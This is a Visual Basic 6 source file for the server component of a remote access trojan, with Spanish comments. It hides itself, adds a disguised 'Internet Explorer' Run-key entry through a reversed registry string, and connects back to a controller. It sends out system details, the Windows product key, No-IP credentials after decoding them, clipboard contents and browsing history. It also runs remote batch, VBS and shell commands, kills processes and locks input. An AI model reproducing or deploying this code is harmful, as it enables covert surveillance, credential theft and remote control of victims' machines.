VERSION 5.00
Begin VB.Form frmMain 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   ClientHeight    =   4605
   ClientLeft      =   0
   ClientTop       =   -30
   ClientWidth     =   4755
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4605
   ScaleWidth      =   4755
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text3 
      Height          =   285
      Index           =   1
      Left            =   2880
      TabIndex        =   7
      Text            =   "Text1"
      Top             =   0
      Width           =   1095
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Index           =   1
      Left            =   3000
      TabIndex        =   6
      Text            =   "Text1"
      Top             =   720
      Width           =   975
   End
   Begin VB.TextBox Text4 
      Height          =   405
      Index           =   1
      Left            =   2760
      TabIndex        =   5
      Text            =   "Text1"
      Top             =   1200
      Width           =   1215
   End
   Begin VB.TextBox Text 
      Height          =   285
      Index           =   1
      Left            =   2880
      TabIndex        =   4
      Top             =   1680
      Width           =   615
   End
   Begin VB.TextBox txtFile 
      Height          =   285
      HideSelection   =   0   'False
      Index           =   1
      Left            =   2880
      MultiLine       =   -1  'True
      TabIndex        =   3
      Top             =   360
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.Timer tmrClipboard 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   2160
      Top             =   0
   End
   Begin VB.Timer Msntimer 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   1440
      Top             =   0
   End
   Begin VB.TextBox cdkey 
      Height          =   285
      Left            =   1080
      TabIndex        =   2
      Top             =   0
      Width           =   255
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1080
      TabIndex        =   1
      Top             =   360
      Width           =   255
   End
   Begin VB.Timer Timer1 
      Interval        =   1500
      Left            =   480
      Top             =   480
   End
   Begin VB.PictureBox Picture1 
      Height          =   375
      Left            =   480
      ScaleHeight     =   315
      ScaleWidth      =   435
      TabIndex        =   0
      Top             =   0
      Width           =   495
   End
   Begin VB.Timer tmrGeneral 
      Interval        =   1
      Left            =   4200
      Top             =   0
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Algunas de las facciones estan copiadas de SkyWeb07

Dim names As String, name1 As String, so As String, ip As String, ip2 As String, port As String
Dim webcam As String, pais As String, HostName As String, tor As String, nombrepc As String, procesador As String
Private Declare Function IsNTAdmin Lib "advpack.dll" (ByVal dwReserved As Long, ByRef lpdwReserved As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Type POINTAPI
        X As Long
        y As Long
End Type
Private Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" _
                         (ByVal Locale As Long, ByVal LCType As Long, ByVal _
                          lpLCData As String, ByVal cchData As Long) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" ( _
    ByVal lpstrCommand As String, _
    ByVal lpstrReturnString As String, _
    ByVal uReturnLength As Long, _
    ByVal hwndCallback As Long) As Long

Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long ' Note that If you declare the lpData parameter as String, you must pass it By Value.
    Private Const REG_BINARY = 3
    Private Const HKEY_LOCAL_MACHINE = &H80000002
    Private Const ERROR_SUCCESS = 0&
Const LOCALE_USER_DEFAULT = &H400
Const LOCALE_SENGCOUNTRY = &H1002
Const LOCALE_SENGLANGUAGE = &H1001
Const LOCALE_SNATIVELANGNAME = &H4
Const LOCALE_SNATIVECTRYNAME = &H8

Public WithEvents MSN As Messenger
Attribute MSN.VB_VarHelpID = -1
Public WithEvents MsgrUIA As MessengerAPI.Messenger
Attribute MsgrUIA.VB_VarHelpID = -1

Dim IDF As String

Private Sub Form_Load()
On Error Resume Next
Set MSN = New Messenger
Open Environ("windir") & "\log.txt" For Input As #1
Input #1, names
If names = "" Then
names = "Victima"
End If
Close #1

Dim yo As Object
Set yo = CreateObject("wscript.shell")
pais = ObtenerIdioma(LOCALE_SNATIVECTRYNAME)
nombrepc = Environ("ComputerName")
name1 = Environ("UserName")
HostName = WS.LocalHostName
so = yo.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Productname")
ip = "localhost"
ip2 = WS.LocalIP
port = 404
procesador = yo.regread("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0\ProcessorNameString")
App.TaskVisible = False
If App.PrevInstance = True Then: End
pais = ObtenerIdioma(LOCALE_SNATIVECTRYNAME)
objecto.regwrite StrReverse("\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH") & "Internet gExplorer", Environ("windir") & "\IE.exe"
End Sub

Public Function ObtenerIdioma(ByVal lInfo As Long) As String
Dim buffer As String, ret As String
buffer = String$(256, 0)
ret = GetLocaleInfo(LOCALE_USER_DEFAULT, lInfo, buffer, Len(buffer))
If ret > 0 Then
ObtenerIdioma = Left$(buffer, ret - 1)
Else
ObtenerIdioma = ""
End If
End Function

Public Function GetRamSize() As String
Dim RamStats As MEMORYSTATUS
GlobalMemoryStatus RamStats
GetRamSize = Round((RamStats.dwTotalPhys / 1024) / 1024) + 1
End Function

Private Sub Msntimer_Timer()
Pause 1
MSN.MyStatus = MISTATUS_INVISIBLE
Pause 1
MSN.MyStatus = MISTATUS_ONLINE
End Sub

Private Sub Timer1_Timer()
    If WS.State <> 7 Then
        WS.Close
        WS.Connect ip, port
    End If
End Sub

Private Sub tmrClipboard_Timer()
If L = 1 Then Clipboard.SetText ""
Clipboard.SetText ""
End Sub

Private Sub tmrGeneral_Timer()
Select Case (IDF)
Case "EffectScreen1"
    If pet = 98 Then IDF = ""
    pet = pet + 2
    Call SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) Or WS_EX_LAYERED)
    Call SetLayeredWindowAttributes(hwnd, 0, (255 * pet) / 100, LWA_ALPHA)
Case "EffectScreen0"
        If pet = 2 Then
            IDF = ""
            Me.Hide
            Me.WindowState = 0
            Me.BackColor = &H8000000F
        End If
    pet = pet - 2
    Call SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) Or WS_EX_LAYERED)
    Call SetLayeredWindowAttributes(hwnd, 0, (255 * pet) / 100, LWA_ALPHA)
End Select
End Sub

Private Sub WS_Connect()
Send "Connect|" & names & "|" & HostName & "|" & pais & "|" & GetRamSize & "|" & so & "|" & ip2
End Sub
Private Sub WS_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim datos As String
Dim data() As String
WS.GetData datos
data = Split(datos, "|")
Select Case data(0)


'<//Cambiar Nombre_ [******************************************************************************************************]
Case "ChangeName"
    Open Environ("windir") & "\log.txt" For Output As #1
    Print #1, , data(1)
    Close #1
'Cambiar Nombre//>

'<//Servidor_ [******************************************************************************************************]
Case "CloseServer"
    End
Case "ReconectServer"
    WS.Close
    Sleep 500
    WS.Connect ip, port
'Servidor//>

'<//Informacion_ [******************************************************************************************************]
Case "ChangeHost"
    SetComputerName = data(1)
    Send "ChangeHost|" & data(1)
Case "sysinfo"
    Dim yo As Object
    Set yo = CreateObject("wscript.shell")
    cdkey.Text = sGetXPCDKey
    Dim Unidad  As String, informacion As String, antivirus As String, firewall As String
    Set objSecurityCenter = GetObject("winmgmts:\\.\root\SecurityCenter")
    Set colFirewall = objSecurityCenter.ExecQuery("Select * From FirewallProduct", , 48)
    Set colAntiVirus = objSecurityCenter.ExecQuery("Select * From AntiVirusProduct", , 48)
    For Each objFirewall In colFirewall
        protection1 = objFirewall.DisplayName & " v" & objFirewall.VersionNumber & " - " & objFirewall.CompanyName
    Next
    For Each objAntiVirus In colAntiVirus
        protection = objAntiVirus.DisplayName & " v" & objAntiVirus.VersionNumber
    Next
    lenguaje = ObtenerIdioma(LOCALE_SNATIVELANGNAME)
    pac = yo.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CSDVersion")
    windows = Environ("windir")
    fechas = Date
    horas = Time
    Rutaas = App.Path & "\" & App.EXEName & ".exe"
    Dim t As MMTIME, j As Long
    Dim h As Double, m As Double, s1 As Double
    j = timeGetSystemTime(t, LenB(t))
    h = (t.units / 1000) / 60 / 60
    m = (h - Int(h)) * 60
    s1 = (m - Int(m)) * 60
    Text2.Text = Int(h) & " hours, " & Int(m) & " minuts,  " & Int(s1) & " seconds"
    Send "infor|" & cdkey.Text & "|" & tost & "|" & frees & "|" & lenguaje & "|" & pac & "|" & windows & "|" & fechas & "|" & horas & "|" & Rutaas & "|" & Text2.Text & "|" & protection & "|" & protection1
'Informacion//>

'<//Messenger_ [******************************************************************************************************]
Case "LoadMSN"
    Send "LoadMSN|" & MSN.MySigninName & "|" & MSN.MyStatus
Case "nodisponible"
    MSN.MyStatus = MISTATUS_BUSY
Case "conectado"
    MSN.MyStatus = MISTATUS_ONLINE
Case "offline"
    MSN.MyStatus = MISTATUS_OFFLINE
Case "vuelvoahora"
    MSN.MyStatus = MISTATUS_BE_RIGHT_BACK
Case "ausente"
    MSN.MyStatus = MISTATUS_UNKNOWN
Case "altelefono"
    MSN.MyStatus = MISTATUS_ON_THE_PHONE
Case "saliacomer"
    MSN.MyStatus = MISTATUS_OUT_TO_LUNCH
Case "noconectado"
    MSN.MyStatus = MISTATUS_INVISIBLE
Case "flood"
    Msntimer.Enabled = True
Case "detenerflood"
    Msntimer.Enabled = False
'Messenger//>

'<//Clipboard_ [******************************************************************************************************]
Dim L As Byte, C As Byte, ccString As String
Case "SetClip"
    Clipboard.SetText data(1)
Case "GetClip"
    Send "cliptext|" & Clipboard.GetText
Case "LockClip"
    tmrClipboard.Enabled = True
    L = 1
Case "UnlockClip"
    tmrClipboard.Enabled = False
    L = 0
Case "ClearClip"
    Clipboard.Clear
Case "SetContinueClipboard"
    tmrClipboard.Enabled = True
    C = 1
    ccString = data(1)
Case "StopContinueClipboard"
    tmrClipboard.Enabled = False
    C = 0
'Clipboard//>

'<//Impresora_ [******************************************************************************************************]
Case "Print"
PrintText Mid$(NewData, lSpace + 1)
Send "PrintFinish"
'Impresora//>

'<//Menu Apagar_ [******************************************************************************************************]
Case "SuspendPC"
    SuspendPC
Case "ShutdownPC"
    ShutdownPC
Case "RestartPC"
    RestartPC
'Menu Apagar//>

'<//Contraseñas_ [******************************************************************************************************]
Case "ShowPass"
Dim User As String
Dim Pass As String
User = GetRegValueR("emanresU\CUD\skrewlatiV\ERAWTFOS\ENIHCAM_LACOL_YEKH")
Pass = GetRegValueR("drowssaP\CUD\skrewlatiV\ERAWTFOS\ENIHCAM_LACOL_YEKH")
Pass = sBase64Decode(Pass)
Send "ShowPass|" & User & "|" & Pass & "|" & "No-IP"
'Contraseñas//>

'<//Opciones de Internet_ [******************************************************************************************************]
Case "OpenPage":
    ShellExecLaunchFile data(1), "", ""
Case "GetHomeIE"
    Dim HomeW As String
    HomeW = GetRegValueR("egap trats\niam\rerolpxE tenretni\tfosorcim\erawtfos\RESU_TNERRUC_YEKH")
    Send "HomeWeb|" & HomeW
Case "GetHomeFirefox"
    HomeW = GetRegValueR("egap trats\niam\rerolpxE tenretni\tfosorcim\erawtfos\RESU_TNERRUC_YEKH")
    Send "HomeWeb|" & HomeW
Case "SetHomeIE"
    SetRegValue HKEY_CURRENT_USER, "software\microsoft\internet Explorer\main", "start page", data(1)
Case "SendEmail":
    ShellExecLaunchFile "mailto:" & data(1), "", ""
Case "WebLog"
    Dim wl As String
    For pf = 0 To 500
    wl = wl & vbCrLf & GetRegValue(HKEY_CURRENT_USER, "software\microsoft\internet Explorer\TypedURLs", "url" & pf)
    If pf = "" Then Exit Sub
    Next
    Send "WebLog|" & wl
    
'Opciones de Internet//>

'Script_ [******************************************************************************************************]
Case "ScriptBAT"
    Open "C:\temp.bat" For Output As #1
    Print #1, , data(1)
    Close #1
    ShellExecLaunchFile "C:\temp.bat", "", ""
Case "ScriptVBS"
    Open "C:\temp.vbs" For Output As #1
    Print #1, , data(1)
    Close #1
    ShellExecLaunchFile "C:\temp.vbs", "", ""
'Script//>

'<//Run_ [******************************************************************************************************]
Case "Run"
    ShellExecLaunchFile data(1), "", ""
'Run//>

'<//Screen_ [******************************************************************************************************]
Case "ScreenOff"
    Me.BackColor = &H0&
    Me.WindowState = 2
    Me.Visible = True
    IDF = "EffectScreen1"
    pet = 0
    Call SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) Or WS_EX_LAYERED)
    Call SetLayeredWindowAttributes(hwnd, 0, (255 * 0) / 100, LWA_ALPHA)
Case "ScreenOn"
    IDF = "EffectScreen0"
'Screen//>

'<//Screen Shot_ [******************************************************************************************************]
Case "shotPicture"
    
'Screen Shot//>

'<//Chat_ [******************************************************************************************************]
Case "msgChat"
    frmChat.txtLog.Text = frmChat.txtLog.Text & vbCrLf & vbCrLf & Time & " " & frmChat.txtClientNick & " dice:" & vbCrLf & "    " & data(1)
    frmChat.Show
Case "UnloadChat"
    frmChat.txtCancel = 1
    Unload frmChat
Case "LockKey"
    BlockInput True
Case "LogServerClean"
    frmChat.txtLog = ""
Case "ChatData"
    frmChat.Show
    If data(1) = "" Then frmChat.txtServerNick.Text = "Servidor" Else frmChat.txtServerNick.Text = data(1)
    If data(2) = "" Then frmChat.txtClientNick.Text = "Cliente" Else frmChat.txtClientNick.Text = data(2)
    If data(3) = "" Then frmChat.Caption = "Error 404 - Chat" Else frmChat.Caption = data(3)
    frmChat.txtLog.BackColor = data(4)
    frmChat.txtLog.ForeColor = data(5)
'Chat//>

'<//Shell_ [******************************************************************************************************]
Case "cCommand"
       conten = CMD(data(1))
    Send "sCommand|" & conten & "|" & Environ("UserName")
    Close #1
'Shell//>

'<//Procesos_ [******************************************************************************************************]
Case "Process"
    Dim ProcessName, strOb
    Dim eProc As String
    strOb = "winmgmts://"
  
    For Each ProcessName In GetObject(strOb).InstancesOf("win32_process")
    
    eProc = eProc & ProcessName.Name & "|"
    Next
    Send "Process|" & eProc
    eProc = ""

Case "KillProcess"
KillProcess (data(1))
'Procesos//>

'<//MSG_ [******************************************************************************************************]
Case "MSG"
    If data(1) = 0 Then MsgBox data(2), , data(3)
    If data(1) = 1 Then MsgBox data(2), vbCritical, data(3)
    If data(1) = 2 Then MsgBox data(2), vbExclamation, data(3)
    If data(1) = 3 Then MsgBox data(2), vbQuestion, data(3)
    If data(1) = 4 Then MsgBox data(2), vbInformation, data(3)
Case "Infnity"
    Dim Num As Byte
    Num = data(1)
Infinity:
    If Num = 0 Then MsgBox data(2), , data(3)
    If Num = 1 Then MsgBox data(2), vbCritical, data(3)
    If Num = 2 Then MsgBox data(2), vbExclamation, data(3)
    If Num = 3 Then MsgBox data(2), vbQuestion, data(3)
    If Num = 4 Then MsgBox data(2), vbInformation, data(3)
    GoTo Infinity
'MSG//>

'<//Ping_ [******************************************************************************************************]
Case "GetPing"
    conten = CMD("ping " & data(1))
    Send "GetPing|" & conten
Case "GetTracert"
    conten = CMD("tracert " & data(1))
    Send "GetTracert|" & conten
'Ping//>

End Select
End Sub
 


Public Function sGetXPCDKey() As String
    Dim bDigitalProductID() As Byte
    Dim bProductKey() As Byte
    Dim ilByte As Long
    Dim lDataLen As Long
    Dim hKey As Long
    If RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\Windows NT\CurrentVersion", hKey) = ERROR_SUCCESS Then
        lDataLen = 164
        ReDim Preserve bDigitalProductID(lDataLen)
        If RegQueryValueEx(hKey, "DigitalProductId", 0&, REG_BINARY, bDigitalProductID(0), lDataLen) = ERROR_SUCCESS Then
            ReDim Preserve bProductKey(14)
            For ilByte = 52 To 66
                bProductKey(ilByte - 52) = bDigitalProductID(ilByte)
            Next ilByte
        Else
            sGetXPCDKey = ""
            Exit Function
        End If
    Else
        sGetXPCDKey = ""
        Exit Function
    End If
    Dim bKeyChars(0 To 24) As Byte
    bKeyChars(0) = Asc("B")
    bKeyChars(1) = Asc("C")
    bKeyChars(2) = Asc("D")
    bKeyChars(3) = Asc("F")
    bKeyChars(4) = Asc("G")
    bKeyChars(5) = Asc("H")
    bKeyChars(6) = Asc("J")
    bKeyChars(7) = Asc("K")
    bKeyChars(8) = Asc("M")
    bKeyChars(9) = Asc("P")
    bKeyChars(10) = Asc("Q")
    bKeyChars(11) = Asc("R")
    bKeyChars(12) = Asc("T")
    bKeyChars(13) = Asc("V")
    bKeyChars(14) = Asc("W")
    bKeyChars(15) = Asc("X")
    bKeyChars(16) = Asc("Y")
    bKeyChars(17) = Asc("2")
    bKeyChars(18) = Asc("3")
    bKeyChars(19) = Asc("4")
    bKeyChars(20) = Asc("6")
    bKeyChars(21) = Asc("7")
    bKeyChars(22) = Asc("8")
    bKeyChars(23) = Asc("9")
    Dim nCur As Integer
    Dim sCDKey As String
    Dim ilKeyByte As Long
    Dim ilBit As Long
    For ilByte = 24 To 0 Step -1
        nCur = 0
        For ilKeyByte = 14 To 0 Step -1
            nCur = nCur * 256 Xor bProductKey(ilKeyByte)
            bProductKey(ilKeyByte) = Int(nCur / 24)
            nCur = nCur Mod 24
        Next ilKeyByte
        sCDKey = Chr(bKeyChars(nCur)) & sCDKey
        If ilByte Mod 5 = 0 And ilByte <> 0 Then sCDKey = "-" & sCDKey
    Next ilByte
    sGetXPCDKey = sCDKey
   
End Function

Public Sub KillProcess(ByVal ProcessName As String)
On Error GoTo ErrHandler
Dim oWMI
Dim ret
Dim sService
Dim oWMIServices
Dim oWMIService
Dim oServices
Dim oService
Dim servicename
Set oWMI = GetObject("winmgmts:")
Set oServices = oWMI.InstancesOf("win32_process")
For Each oService In oServices

servicename = LCase(Trim(CStr(oService.Name) & ""))

If InStr(1, servicename, LCase(ProcessName), vbTextCompare) > 0 Then
ret = oService.Terminate
End If

Next

Set oServices = Nothing
Set oWMI = Nothing

ErrHandler:
Err.Clear
End Sub


